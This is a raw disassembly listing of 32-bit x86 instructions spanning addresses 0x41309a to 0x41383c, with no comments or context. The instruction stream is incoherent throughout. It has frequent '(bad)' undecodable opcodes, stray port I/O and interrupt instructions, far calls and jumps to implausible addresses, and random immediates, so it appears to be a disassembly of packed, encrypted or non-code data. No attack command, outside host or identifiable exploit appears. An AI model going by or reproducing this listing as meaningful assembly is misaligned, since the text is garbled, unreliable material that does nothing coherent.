  41309a:	mov    ?,esp
  41309c:	xchg   edi,eax
  41309d:	fbld   TBYTE PTR [eax+0x3c]
  4130a0:	inc    ebx
  4130a1:	sbb    esi,DWORD PTR [edx+0x41724f1]
  4130a7:	xor    ch,BYTE PTR [eax-0x9]
  4130aa:	out    dx,eax
  4130ab:	jg     0x41305e
  4130ad:	std    
  4130ae:	(bad)  
  4130af:	xor    al,al
  4130b1:	outs   dx,DWORD PTR ds:[esi]
  4130b2:	imul   ebp,DWORD PTR [esi+0x1f2b84d3],0x719b877e
  4130bc:	ins    DWORD PTR es:[edi],dx
  4130bd:	frstor [edx+0x58eeba47]
  4130c3:	adc    cl,BYTE PTR [edx]
  4130c5:	and    edx,DWORD PTR [ebx]
  4130c7:	jns    0x413063
  4130c9:	neg    BYTE PTR [esi+0x5]
  4130cc:	mov    bl,0x44
  4130ce:	pop    esp
  4130cf:	xor    esi,esp
  4130d1:	out    0x3,al
  4130d3:	fnstsw WORD PTR [esi]
  4130d5:	xor    ch,BYTE PTR [ebx+0x67]
  4130d8:	(bad)  
  4130d9:	fcomp  DWORD PTR [ecx-0x5b34c9e9]
  4130df:	mov    dh,0xec
  4130e1:	mov    ah,0x48
  4130e3:	xor    ecx,DWORD PTR [edx]
  4130e5:	ret    
  4130e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130e7:	adc    esp,DWORD PTR [edi+0x51]
  4130ea:	and    DWORD PTR [ebx+ebp*1-0x19336746],ebp
  4130f1:	inc    esi
  4130f2:	aas    
  4130f3:	cli    
  4130f4:	into   
  4130f5:	push   ebp
  4130f6:	dec    ebx
  4130f7:	outs   dx,BYTE PTR ds:[esi]
  4130f8:	out    dx,eax
  4130f9:	int    0x6c
  4130fb:	outs   dx,BYTE PTR ds:[esi]
  4130fc:	mov    al,ds:0x28a23158
  413101:	shr    DWORD PTR [ecx-0x22],cl
  413104:	sub    BYTE PTR [edi],cl
  413106:	xchg   esi,eax
  413107:	cs fwait
  413109:	pushf  
  41310a:	sub    DWORD PTR [edx],ebp
  41310c:	cdq    
  41310d:	ficomp DWORD PTR [edi-0x76]
  413110:	je     0x4130cf
  413112:	daa    
  413113:	js     0x4130a3
  413115:	scas   eax,DWORD PTR es:[edi]
  413116:	arpl   si,bx
  413118:	(bad)  
  413119:	icebp  
  41311a:	ins    DWORD PTR es:[edi],dx
  41311b:	and    al,0xd5
  41311d:	sbb    DWORD PTR [esi+ebp*2],eax
  413120:	xlat   BYTE PTR ds:[ebx]
  413121:	mov    DWORD PTR ds:0xe8e438b6,edi
  413127:	pop    ds
  413128:	jp     0x413173
  41312a:	jno    0x413142
  41312c:	(bad)  
  41312d:	in     al,0xef
  41312f:	push   ss
  413130:	add    al,0xb1
  413132:	mov    WORD PTR ds:0x37aa31fc,cs
  413138:	out    0x2e,eax
  41313a:	std    
  41313b:	loop   0x413142
  41313d:	pop    ecx
  41313e:	dec    eax
  41313f:	sbb    ah,bh
  413141:	data16 clc 
  413143:	lock cmp DWORD PTR [esi],ebp
  413146:	call   0xa1be:0x79c49025
  41314d:	call   0xb221:0x527f3605
  413154:	stc    
  413155:	dec    edi
  413156:	and    DWORD PTR [eax+0x1d42f2ca],0xcb494cf7
  413160:	out    0x6f,al
  413162:	ret    
  413163:	xchg   ebx,eax
  413164:	dec    edi
  413165:	sub    al,0xf8
  413167:	xchg   edx,eax
  413168:	inc    eax
  413169:	loope  0x4131b1
  41316b:	push   esp
  41316c:	and    ecx,0x3e
  41316f:	jle    0x4131e2
  413171:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413172:	icebp  
  413173:	in     al,0x4b
  413175:	jns    0x4130f9
  413177:	lahf   
  413178:	jo     0x4131cc
  41317a:	or     cl,0x60
  41317d:	or     eax,0xc1e5de5
  413182:	mov    WORD PTR ds:[esp+edi*1],cs
  413186:	sub    ebp,edi
  413188:	(bad)  
  413189:	data16 fidivr WORD PTR [eax+0xfe9537d]
  413190:	xor    eax,eax
  413192:	jecxz  0x413206
  413194:	push   es
  413195:	outs   dx,DWORD PTR ss:[esi]
  413197:	mov    ch,0x8a
  413199:	cmc    
  41319a:	pop    edx
  41319b:	daa    
  41319c:	cmp    eax,0x32efa2b2
  4131a1:	test   al,0x83
  4131a3:	(bad)  
  4131a4:	jo     0x41320e
  4131a6:	add    al,0x6b
  4131a8:	(bad)  
  4131a9:	test   eax,0xe4f438c0
  4131ae:	mov    ebp,0x96705511
  4131b3:	mov    WORD PTR ds:0xed6ce3b,gs
  4131b9:	mov    WORD PTR [ebx+0x63],?
  4131bc:	ins    DWORD PTR es:[edi],dx
  4131bd:	inc    ecx
  4131be:	push   ds
  4131bf:	push   esp
  4131c0:	dec    edx
  4131c1:	mov    bh,0x9
  4131c3:	pusha  
  4131c4:	into   
  4131c5:	in     eax,dx
  4131c6:	sub    bh,bh
  4131c8:	jno    0x413166
  4131ca:	mov    dh,0xa4
  4131cc:	lds    esi,FWORD PTR [esi+ebx*8+0x7577f488]
  4131d3:	mov    al,ds:0x17d27581
  4131d8:	mov    ch,dh
  4131da:	cmc    
  4131db:	and    eax,0x516741a1
  4131e0:	jbe    0x41321f
  4131e2:	push   esi
  4131e3:	mov    DWORD PTR [esi],ebp
  4131e5:	sahf   
  4131e6:	sbb    al,0x83
  4131e8:	xor    al,0x9f
  4131ea:	push   es
  4131eb:	xor    dl,BYTE PTR [eax]
  4131ed:	div    eax
  4131ef:	jmp    0x3bba29b8
  4131f4:	repz xchg edi,eax
  4131f6:	push   ss
  4131f7:	fldcw  WORD PTR [eax-0x76]
  4131fa:	xchg   esi,eax
  4131fb:	fistp  WORD PTR [ebx+0x3716b649]
  413201:	es int3 
  413203:	test   eax,0xcb885480
  413208:	lahf   
  413209:	push   esp
  41320a:	xchg   BYTE PTR [ebx-0x78],ah
  41320d:	js     0x4131ed
  41320f:	push   eax
  413210:	or     al,0x56
  413212:	div    DWORD PTR [edi-0x1f41a7dc]
  413218:	adc    BYTE PTR [ebx],0x3b
  41321b:	loope  0x413293
  41321d:	jge    0x4131ed
  41321f:	mov    edx,0xca6168b
  413224:	or     al,0xcc
  413226:	popf   
  413227:	mov    WORD PTR [eax-0x28],cs
  41322a:	xlat   BYTE PTR ds:[ebx]
  41322b:	fwait
  41322c:	xor    cl,BYTE PTR [edx-0x28dcf400]
  413232:	out    dx,eax
  413233:	add    BYTE PTR [edx],bl
  413235:	push   ecx
  413236:	ds cmp al,0x6c
  413239:	xlat   BYTE PTR ds:[ebx]
  41323a:	scas   eax,DWORD PTR es:[edi]
  41323b:	jle    0x88832937
  413241:	xor    eax,0x8adeed5e
  413246:	adc    eax,0xf5ae4694
  41324b:	test   BYTE PTR [ebp+ecx*1+0x36],ch
  41324f:	mov    ebx,0xdad957
  413254:	aam    0x18
  413256:	cld    
  413257:	xchg   ebp,eax
  413258:	inc    ecx
  413259:	or     eax,0x475b927a
  41325e:	dec    esp
  41325f:	cmp    DWORD PTR [edx+edi*8+0x7b],eax
  413263:	sub    al,0xfa
  413265:	test   ax,0x251d
  413269:	pop    eax
  41326a:	nop
  41326b:	(bad)  
  41326c:	call   0x99a6969a
  413271:	cmp    BYTE PTR [edi+0x1ce13ab3],dh
  413277:	ss cli 
  413279:	jl     0x41328b
  41327b:	mov    esp,DWORD PTR [esi-0x41]
  41327e:	and    ecx,edi
  413280:	xor    edx,esp
  413282:	sub    BYTE PTR [ecx+0x5b],ah
  413285:	adc    dl,BYTE PTR [esi]
  413287:	push   edi
  413288:	mov    eax,ds:0xe564b093
  41328d:	add    ch,cl
  41328f:	(bad)  
  413290:	bswap  esi
  413292:	outs   dx,BYTE PTR ds:[esi]
  413293:	jmp    0x4132cd
  413295:	xor    esi,edx
  413297:	xlat   BYTE PTR ds:[ebx]
  413298:	cmp    bl,BYTE PTR [ecx]
  41329a:	fwait
  41329b:	loopne 0x413222
  41329d:	mov    eax,0x53395bc8
  4132a2:	icebp  
  4132a3:	dec    ebp
  4132a4:	cmp    BYTE PTR [edx+0x51],al
  4132a7:	fistp  WORD PTR [edi-0x59af40c1]
  4132ad:	add    al,0x9f
  4132af:	add    ecx,DWORD PTR [esi-0x57]
  4132b2:	das    
  4132b3:	fsubr  QWORD PTR [edi-0x69]
  4132b6:	sbb    dh,dl
  4132b8:	repnz mov edi,0x249ca56d
  4132be:	or     ah,BYTE PTR [esi]
  4132c0:	popf   
  4132c1:	mov    ebx,0x28aadb1e
  4132c6:	push   edx
  4132c7:	jns    0x4132a6
  4132c9:	add    ch,BYTE PTR [esi-0x55]
  4132cc:	lods   eax,DWORD PTR ds:[esi]
  4132cd:	xchg   ecx,eax
  4132ce:	dec    ebp
  4132cf:	into   
  4132d0:	ins    BYTE PTR es:[di],dx
  4132d2:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132d4:	(bad)  
  4132d6:	scas   al,BYTE PTR es:[edi]
  4132d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132d8:	or     bl,dh
  4132da:	je     0x4132cf
  4132dc:	(bad)  
  4132dd:	cld    
  4132de:	add    BYTE PTR [edx],0x20
  4132e1:	cli    
  4132e2:	fs (bad) 
  4132e4:	mov    ebx,0xddb43377
  4132e9:	jmp    0x41326d
  4132eb:	(bad)  
  4132ec:	cmp    esi,esp
  4132ee:	sbb    DWORD PTR [edi],0xdb7e2381
  4132f4:	adc    DWORD PTR [eax],0x52
  4132f7:	add    eax,eax
  4132f9:	cmp    BYTE PTR [edi+0x6b],ah
  4132fc:	sbb    edi,DWORD PTR [esi-0x73]
  4132ff:	mov    ds:0x3e1bb2f7,al
  413304:	popa   
  413305:	ror    DWORD PTR fs:[esi],0x84
  413309:	sti    
  41330a:	inc    ecx
  41330b:	adc    esp,DWORD PTR [esi+0x4705c650]
  413311:	mov    esp,0x5a56742a
  413316:	sbb    ebp,DWORD PTR [ecx]
  413318:	aad    0x19
  41331a:	das    
  41331b:	std    
  41331c:	popa   
  41331d:	pop    edi
  41331e:	or     ecx,ebx
  413320:	cmc    
  413321:	sbb    eax,0x2ace2d00
  413326:	or     eax,0x8bcb98b0
  41332b:	retf   0x2f2c
  41332e:	sub    esp,DWORD PTR [eax]
  413330:	xor    ch,BYTE PTR [ecx-0x357d7228]
  413336:	clc    
  413337:	int    0x5e
  413339:	cdq    
  41333a:	sti    
  41333b:	jg     0x41335d
  41333d:	leave  
  41333e:	test   BYTE PTR [eax+ecx*4],bh
  413341:	dec    ebp
  413342:	cwde   
  413343:	pop    ecx
  413344:	add    DWORD PTR [esp+edx*2-0x307567c7],ebp
  41334b:	(bad)  
  41334c:	cli    
  41334d:	xchg   edi,eax
  41334e:	sbb    ecx,DWORD PTR [eax-0x57ad1f0b]
  413354:	pop    ebx
  413355:	cmp    ah,BYTE PTR [edi+0x199ca6cb]
  41335b:	add    bh,BYTE PTR [ebx+0x613db090]
  413361:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413362:	mov    al,BYTE PTR [esi+esi*2+0x7d8ac98a]
  413369:	dec    eax
  41336b:	cmp    al,0x49
  41336d:	dec    ecx
  41336e:	and    al,0xc8
  413370:	dec    edx
  413371:	dec    eax
  413372:	mov    WORD PTR [esi-0x32],es
  413375:	fcmovnu st,st(7)
  413377:	adc    eax,0xe17bc5ac
  41337c:	inc    ebp
  41337d:	add    ebx,DWORD PTR [ecx-0x57]
  413380:	sbb    ebx,DWORD PTR [edx-0x3]
  413383:	aaa    
  413384:	arpl   WORD PTR ds:0x1aa6b745,di
  41338a:	ds leave 
  41338c:	jnp    0x41338a
  41338e:	outs   dx,DWORD PTR ds:[esi]
  41338f:	aaa    
  413390:	xchg   ecx,eax
  413391:	std    
  413392:	cs pop ebp
  413394:	jno    0x4133b6
  413396:	mov    BYTE PTR [edi+0x3],al
  413399:	pop    esi
  41339a:	and    esp,eax
  41339c:	es ss and edx,0xffffffa1
  4133a1:	outs   dx,DWORD PTR ds:[esi]
  4133a2:	inc    edx
  4133a3:	cli    
  4133a4:	clc    
  4133a5:	mov    ebp,0x30c90d40
  4133aa:	push   ecx
  4133ab:	outs   dx,DWORD PTR gs:[esi]
  4133ad:	and    eax,0x64988205
  4133b2:	add    DWORD PTR [eax-0x5bc4ef86],ebp
  4133b8:	scas   eax,DWORD PTR es:[edi]
  4133b9:	rol    DWORD PTR [ecx],1
  4133bb:	pop    eax
  4133bc:	mov    ebx,?
  4133be:	push   0xaff7099b
  4133c3:	cli    
  4133c4:	pop    ss
  4133c5:	xchg   ebx,eax
  4133c6:	in     eax,dx
  4133c7:	rcr    BYTE PTR [ecx+0x11],0xdc
  4133cb:	fwait
  4133cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133cd:	sbb    al,0x84
  4133cf:	jmp    0x4133e3
  4133d1:	push   cs
  4133d2:	add    BYTE PTR [edi],al
  4133d4:	cwde   
  4133d5:	aad    0x60
  4133d7:	sub    al,0x9e
  4133d9:	loopne 0x413458
  4133db:	mov    al,ds:0x36bc4935
  4133e0:	and    eax,0x19be2140
  4133e5:	dec    edx
  4133e6:	add    edx,DWORD PTR [eax-0x75]
  4133e9:	lods   al,BYTE PTR ds:[esi]
  4133ea:	rcl    BYTE PTR [ebp-0x68a05ca8],0x80
  4133f1:	xor    al,0x1
  4133f3:	adc    esp,DWORD PTR [edx+edx*4+0xb]
  4133f7:	imul   BYTE PTR [esi]
  4133f9:	pop    edi
  4133fa:	fld    QWORD PTR [edi]
  4133fc:	mov    esi,0x650ce3e9
  413401:	jp     0x413451
  413403:	ins    BYTE PTR es:[edi],dx
  413404:	jnp    0x413483
  413406:	stc    
  413407:	outs   dx,BYTE PTR ds:[esi]
  413408:	dec    ebp
  413409:	and    eax,0x969dd37c
  41340e:	and    BYTE PTR [edx+0x3f0217a7],al
  413414:	and    dl,bh
  413416:	out    dx,eax
  413417:	jmp    0x413421
  413419:	call   0x2881a0cb
  41341e:	sub    DWORD PTR [eax-0x3f],edi
  413421:	xchg   edi,eax
  413422:	sub    al,0xaf
  413424:	add    al,cl
  413426:	scas   eax,DWORD PTR es:[edi]
  413427:	sbb    al,0xb6
  413429:	cs pop esi
  41342b:	mov    ch,0xd7
  41342d:	adc    bl,BYTE PTR [edi+edx*8-0x24]
  413431:	dec    ebx
  413432:	out    dx,al
  413433:	lods   eax,DWORD PTR ds:[esi]
  413434:	xchg   edi,eax
  413435:	mov    dl,0x6d
  413437:	or     eax,0x65572983
  41343c:	sub    eax,0x12fe918e
  413441:	fadd   QWORD PTR ds:0x843da067
  413447:	sub    dl,BYTE PTR [eax-0x15]
  41344a:	fwait
  41344b:	lock sub eax,0xd708b11a
  413451:	mov    ds:0x6b937455,al
  413456:	xor    DWORD PTR [ecx+0x1d],edx
  413459:	xor    DWORD PTR [esi+0x748354b7],ebp
  41345f:	mov    eax,0x392815a5
  413464:	test   dh,dl
  413466:	jp     0x4133fc
  413468:	ds sub ecx,esp
  41346b:	jecxz  0x413482
  41346d:	jecxz  0x413496
  41346f:	ja     0x413457
  413471:	xchg   ebx,eax
  413472:	jmp    0x413416
  413474:	cmp    DWORD PTR [edi+0x6dc8c507],ecx
  41347a:	and    BYTE PTR [esi+0x45181160],cl
  413480:	fmul   DWORD PTR [ecx]
  413482:	or     ecx,DWORD PTR [edi-0x725f10aa]
  413488:	sub    al,0xe7
  41348a:	mov    ds:0x14c0ad95,al
  41348f:	popf   
  413490:	int3   
  413491:	fadd   QWORD PTR [esi+0x30]
  413494:	cs gs punpckhbw mm1,mm5
  413499:	push   0xffffffbf
  41349b:	inc    edx
  41349c:	push   ds
  41349d:	sar    al,1
  41349f:	adc    eax,DWORD PTR [ecx]
  4134a1:	sbb    BYTE PTR [eax],dh
  4134a3:	add    DWORD PTR [edx],ebx
  4134a5:	sbb    dh,BYTE PTR [esi-0x2]
  4134a8:	scas   al,BYTE PTR es:[edi]
  4134a9:	loope  0x41350d
  4134ab:	cmp    al,0x75
  4134ad:	xchg   esi,eax
  4134ae:	lds    edi,FWORD PTR [ecx-0xfc35ee1]
  4134b4:	jge    0x4134ee
  4134b6:	pop    edx
  4134b7:	ja     0x413460
  4134b9:	cwde   
  4134ba:	add    eax,0x8583f24f
  4134bf:	adc    dl,BYTE PTR [ecx]
  4134c1:	ds cmp bh,ah
  4134c4:	and    al,0xa8
  4134c6:	std    
  4134c7:	sahf   
  4134c8:	or     DWORD PTR [esp+ebx*1-0x5a],esi
  4134cc:	pop    ebx
  4134cd:	cwde   
  4134ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134cf:	mov    ebx,0xed8c04c5
  4134d4:	and    DWORD PTR [esi-0x59],edi
  4134d7:	call   0xb7545f08
  4134dc:	xor    edx,ecx
  4134de:	fidivr DWORD PTR [esi+0x3e30185e]
  4134e4:	stos   BYTE PTR es:[edi],al
  4134e5:	stc    
  4134e6:	push   esi
  4134e7:	pop    ss
  4134e8:	pop    esp
  4134e9:	push   esp
  4134ea:	les    ecx,FWORD PTR [ecx+edi*8+0x6877ff5c]
  4134f1:	xchg   esp,eax
  4134f2:	leave  
  4134f3:	add    al,0xfd
  4134f5:	jnp    0x41351a
  4134f7:	mov    eax,0xad58f5b6
  4134fc:	push   ebp
  4134fd:	mov    bh,0x82
  4134ff:	adc    ecx,DWORD PTR [ebx]
  413501:	lods   eax,DWORD PTR ds:[esi]
  413502:	ins    DWORD PTR es:[edi],dx
  413503:	sub    eax,0xaac6132
  413508:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413509:	dec    ebx
  41350a:	jmp    0x7eef2412
  41350f:	dec    edi
  413510:	in     eax,dx
  413511:	(bad)  
  413512:	(bad)  
  413513:	xchg   ebp,eax
  413514:	push   ebp
  413515:	(bad)  
  413516:	repnz into 
  413518:	pop    eax
  413519:	je     0x4134c2
  41351b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41351c:	cld    
  41351d:	into   
  41351e:	stos   DWORD PTR es:[edi],eax
  41351f:	gs pop eax
  413521:	jmp    0x41357f
  413523:	dec    esi
  413524:	sub    ebx,0x7f
  413527:	or     DWORD PTR [ebx-0x5e3286a0],0x45
  41352e:	add    ah,0x4f
  413531:	pop    ds
  413532:	ja     0x41356b
  413534:	clc    
  413535:	pop    ebp
  413536:	mov    esi,0x80fc6c5e
  41353b:	mov    eax,ds:0x79ebaf22
  413540:	das    
  413541:	and    ah,BYTE PTR [eax-0x13]
  413544:	sbb    DWORD PTR [ebp+0x74871bf1],eax
  41354a:	xchg   ebp,eax
  41354b:	push   esi
  41354c:	out    0xba,al
  41354e:	inc    esi
  41354f:	mov    esp,0x69466039
  413554:	xor    al,0x7d
  413556:	cli    
  413557:	scas   eax,DWORD PTR es:[edi]
  413558:	mov    esp,0xa0ff8c60
  41355d:	push   cs
  41355e:	js     0x4135d0
  413560:	aas    
  413561:	daa    
  413562:	fnstcw WORD PTR [edi-0x16d195da]
  413568:	dec    esi
  413569:	in     eax,0x30
  41356b:	push   eax
  41356c:	and    al,0x56
  41356e:	(bad)  [esp+ebx*8]
  413571:	jecxz  0x4135a0
  413573:	mov    esi,ebp
  413575:	hlt    
  413576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413577:	dec    esi
  413578:	dec    ebx
  413579:	stos   DWORD PTR es:[edi],eax
  41357a:	mov    ds:0x7cabe259,eax
  41357f:	bound  ecx,QWORD PTR ds:0x5ed908fe
  413585:	daa    
  413586:	lods   al,BYTE PTR ds:[esi]
  413587:	fidivr WORD PTR [edx]
  413589:	sbb    ecx,DWORD PTR [ecx]
  41358b:	dec    ebx
  41358c:	sub    eax,0x4b4204ad
  413591:	cs mov bl,0x70
  413594:	xor    al,0xb1
  413596:	mov    dh,0xa0
  413598:	mov    ebp,cs
  41359a:	sbb    eax,0xd8d5a838
  41359f:	std    
  4135a0:	xor    eax,0xf04ea65f
  4135a5:	mov    cl,0x25
  4135a7:	push   ss
  4135a8:	dec    ecx
  4135a9:	fild   QWORD PTR [edi]
  4135ab:	test   esp,eax
  4135ad:	inc    eax
  4135ae:	mov    bh,0xaa
  4135b0:	call   ebp
  4135b2:	or     dl,BYTE PTR [edi+0x4e]
  4135b5:	adc    al,0xd0
  4135b7:	xchg   ebx,eax
  4135b8:	(bad)  
  4135b9:	fisubr DWORD PTR [esi+0x22]
  4135bc:	sahf   
  4135bd:	jnp    0x413585
  4135bf:	jno    0x4135be
  4135c1:	xor    cl,bh
  4135c3:	in     eax,dx
  4135c4:	outs   dx,DWORD PTR ds:[esi]
  4135c5:	or     eax,0xee693c29
  4135ca:	adc    bl,dh
  4135cc:	and    al,0xe3
  4135ce:	fisttp WORD PTR [edx-0x29]
  4135d1:	dec    eax
  4135d2:	ret    
  4135d3:	and    al,0xb2
  4135d5:	mov    ds:0x3ad32075,eax
  4135da:	icebp  
  4135db:	ss fucom st(2)
  4135de:	and    BYTE PTR [ecx],dh
  4135e0:	outs   dx,DWORD PTR ds:[esi]
  4135e1:	fcom   DWORD PTR [edx]
  4135e3:	push   es
  4135e4:	out    dx,eax
  4135e5:	loop   0x4135d2
  4135e7:	cmp    eax,0xee2818b7
  4135ec:	repz jg 0x413580
  4135ef:	cmp    DWORD PTR [ecx+0x45270009],0x225d55fc
  4135f9:	cld    
  4135fa:	add    eax,0x4cff079c
  4135ff:	das    
  413600:	shl    ah,0x1c
  413603:	mov    dh,0x3f
  413605:	mov    esp,DWORD PTR ss:[ecx-0x2ad607a6]
  41360c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41360d:	mov    DWORD PTR [ebp-0x3d],edi
  413610:	pop    edi
  413611:	aad    0xc7
  413613:	sbb    DWORD PTR [ebx+0x2b],esi
  413616:	lahf   
  413617:	mov    ch,cl
  413619:	repz pop ebx
  41361b:	test   ch,0x1
  41361e:	loopne 0x413645
  413620:	fisttp DWORD PTR [edx-0xf2970cb]
  413626:	xor    BYTE PTR [esi+0x65739333],ah
  41362c:	adc    ebx,eax
  41362e:	enter  0x905,0x6f
  413632:	pop    ebp
  413633:	es push ss
  413635:	xchg   ebp,eax
  413636:	(bad)  
  413637:	cli    
  413638:	pop    ds
  413639:	mov    dl,0x85
  41363b:	adc    DWORD PTR [edi-0x4d],0x5c
  41363f:	adc    cl,BYTE PTR [edx]
  413641:	cmp    ch,BYTE PTR [ebx-0x1af74ee4]
  413647:	aad    0xb5
  413649:	sbb    bl,BYTE PTR [edx+edx*4+0x4555f23f]
  413650:	shl    esp,1
  413652:	mov    al,ds:0x355c9582
  413657:	rol    DWORD PTR [ebx-0x536df569],cl
  41365d:	test   DWORD PTR [edx],ecx
  41365f:	mov    dl,cl
  413661:	arpl   WORD PTR [ecx+ecx*1],ax
  413664:	and    dl,BYTE PTR [ebx+0x68]
  413667:	(bad)
  41366a:	out    dx,al
  41366b:	push   esi
  41366c:	cmp    al,0xb2
  41366e:	stos   BYTE PTR es:[edi],al
  41366f:	mov    dh,0x29
  413671:	ins    DWORD PTR es:[edi],dx
  413672:	jp     0x41364d
  413674:	stos   BYTE PTR es:[edi],al
  413675:	(bad)  
  413677:	pop    edx
  413678:	pop    edi
  413679:	retf   0xe082
  41367c:	ficomp WORD PTR [ebp+0x1021a302]
  413682:	sbb    al,0x56
  413684:	add    BYTE PTR [eax],0x5c
  413687:	push   edi
  413688:	sbb    al,0xcd
  41368a:	jb     0x4136d7
  41368c:	ins    DWORD PTR es:[edi],dx
  41368d:	rcr    DWORD PTR [edi],1
  41368f:	and    ch,bl
  413691:	and    BYTE PTR ds:0xbeaf3c5c,0xe9
  413698:	addr16 xor dl,0x37
  41369c:	fsub   QWORD PTR [edx+0x2a]
  41369f:	pop    esp
  4136a0:	or     eax,0x7b1b53f7
  4136a5:	ret    0x558a
  4136a8:	je     0x413694
  4136aa:	aaa    
  4136ab:	mov    bl,0x19
  4136ad:	adc    al,0xd
  4136af:	aam    0xfe
  4136b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136b2:	in     eax,0xed
  4136b4:	and    al,0x93
  4136b6:	pop    eax
  4136b7:	(bad)  
  4136b8:	mov    ds:0x2525911a,al
  4136bd:	(bad)  
  4136be:	out    0x3f,al
  4136c0:	sbb    DWORD PTR [edi+0x7efc7e24],ecx
  4136c6:	jb     0x4136ed
  4136c8:	mov    ?,WORD PTR [eax+eiz*1]
  4136cb:	and    edx,ebp
  4136cd:	je     0x413747
  4136cf:	mov    ah,0x59
  4136d1:	jb     0x413751
  4136d3:	sbb    eax,0xec16bc64
  4136d8:	fsubr  st(2),st
  4136da:	jae    0x4136a6
  4136dc:	mov    eax,0x14a9cdd8
  4136e1:	fld    DWORD PTR [edx-0x4e]
  4136e4:	pushf  
  4136e5:	out    0xe8,eax
  4136e7:	add    BYTE PTR [eax-0x231d7231],ch
  4136ed:	pop    ebp
  4136ee:	cmp    DWORD PTR [eax+esi*8-0x18],0x16207ac9
  4136f6:	cmc    
  4136f7:	jns    0x413721
  4136f9:	and    al,0x6f
  4136fb:	iret   
  4136fc:	sbb    esi,DWORD PTR [ecx+0xb873a66]
  413702:	push   0xa4067a9a
  413707:	pushf  
  413708:	frstor [ecx+0x3c]
  41370b:	imul   ebp,DWORD PTR [esi+0x920272b],0x6f
  413712:	pop    es
  413713:	cmp    BYTE PTR [esi-0x282dc27d],bh
  413719:	push   cs
  41371a:	iret   
  41371b:	retf   
  41371c:	hlt    
  41371d:	adc    bh,dh
  41371f:	stos   BYTE PTR es:[edi],al
  413720:	mov    DWORD PTR [eax+0x5eb90f85],edx
  413726:	mov    al,ah
  413728:	jmp    0xd4becee
  41372d:	test   DWORD PTR [esi+0x41c69632],ebx
  413733:	inc    ebp
  413734:	cwde   
  413735:	mov    dh,0xdd
  413737:	arpl   di,sp
  413739:	outs   dx,BYTE PTR ds:[esi]
  41373a:	lock push ebx
  41373c:	lods   al,BYTE PTR ds:[esi]
  41373d:	test   dh,0x1
  413740:	jmp    0x41379a
  413742:	(bad)  
  413743:	push   edi
  413744:	ret    0x56fe
  413747:	xchg   edx,eax
  413748:	jle    0x4136d2
  41374a:	aaa    
  41374b:	ins    BYTE PTR es:[edi],dx
  41374c:	mov    ecx,0x17d4fc97
  413751:	ins    BYTE PTR es:[edi],dx
  413752:	xchg   esi,eax
  413753:	mov    ch,0x1d
  413755:	cmp    dl,BYTE PTR [ecx-0x5d]
  413758:	cwde   
  413759:	ret    
  41375a:	dec    ecx
  41375b:	push   ds
  41375c:	jmp    0xf3c87dd8
  413761:	mov    ch,bl
  413763:	cld    
  413764:	add    eax,0x95333e24
  413769:	repnz mov esi,0xb2aebbb2
  413770:	ss xor al,0x6b
  413773:	inc    ebx
  413774:	jp     0x4137a8
  413776:	pop    ecx
  413777:	(bad)  
  413778:	jbe    0x413708
  41377a:	sahf   
  41377b:	shl    DWORD PTR [ecx-0x603e34c7],cl
  413781:	jae    0x41378c
  413783:	jl     0x413774
  413785:	dec    edx
  413786:	sub    ah,0x54
  413789:	das    
  41378a:	xchg   ebx,eax
  41378b:	aaa    
  41378c:	push   esi
  41378d:	or     al,0x7c
  41378f:	sub    eax,0xe1b9ec8d
  413794:	in     eax,dx
  413795:	xchg   BYTE PTR [ecx+0x10e87749],dh
  41379b:	mov    esp,0x9a281413
  4137a0:	aad    0xdc
  4137a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137a3:	xlat   BYTE PTR ds:[ebx]
  4137a4:	ffreep st(4)
  4137a6:	jg     0x413760
  4137a8:	push   ecx
  4137a9:	mov    ds:0xd1a57e85,al
  4137ae:	jecxz  0x4137fe
  4137b0:	adc    BYTE PTR [eax+0x20],dh
  4137b3:	mov    esi,0x65e59e65
  4137b8:	lea    ecx,[ecx+0x2a]
  4137bb:	pop    ds
  4137bc:	dec    bl
  4137be:	ffreep st(4)
  4137c0:	stos   DWORD PTR es:[edi],eax
  4137c1:	inc    eax
  4137c2:	je     0x41379d
  4137c4:	(bad)  
  4137c5:	out    0x51,eax
  4137c7:	dec    ecx
  4137c8:	cmp    edi,edi
  4137ca:	mov    eax,ds:0x747ed1fa
  4137cf:	in     al,dx
  4137d0:	jno    0x413847
  4137d2:	mov    bl,0x1f
  4137d4:	(bad)  
  4137d5:	fdivr  QWORD PTR [ebx-0x75]
  4137d8:	je     0x4137ea
  4137da:	push   esi
  4137db:	jbe    0x41382d
  4137dd:	cmp    ebx,ecx
  4137df:	int    0x19
  4137e1:	push   ebx
  4137e2:	pop    ebx
  4137e3:	fdiv   DWORD PTR [ecx+0xd]
  4137e6:	pop    edx
  4137e7:	(bad)  
  4137e8:	mov    ch,0xf8
  4137ea:	in     eax,0x5f
  4137ec:	push   esi
  4137ed:	jmp    0x120c1c48
  4137f2:	enter  0xff2,0x59
  4137f6:	pop    ebx
  4137f7:	jnp    0x413794
  4137f9:	and    al,0x6c
  4137fb:	fbstp  TBYTE PTR [esi+0xb0fa320]
  413801:	mov    ch,0x13
  413803:	imul   DWORD PTR [esi-0x275a87de]
  413809:	mov    bl,0x2a
  41380b:	lock sub DWORD PTR ss:[edi+0x63dafb6],esi
  413813:	push   cs
  413814:	fcom   DWORD PTR [esi-0x2cfc1bc6]
  41381a:	jl     0x413898
  41381c:	mov    al,0x8e
  41381e:	loop   0x4137a3
  413820:	outs   dx,DWORD PTR ds:[esi]
  413821:	mov    dh,0x10
  413823:	pop    edi
  413824:	cmp    eax,0x9bd6663e
  413829:	in     eax,dx
  41382a:	scas   al,BYTE PTR es:[edi]
  41382b:	adc    BYTE PTR [edi],al
  41382d:	(bad)  
  413830:	popf   
  413831:	or     edi,DWORD PTR [edi+0x1e9a2821]
  413837:	fcomp  st(1)
  413839:	dec    esi
  41383a:	das    
  41383b:	icebp  
  41383c:	out    0x22,al
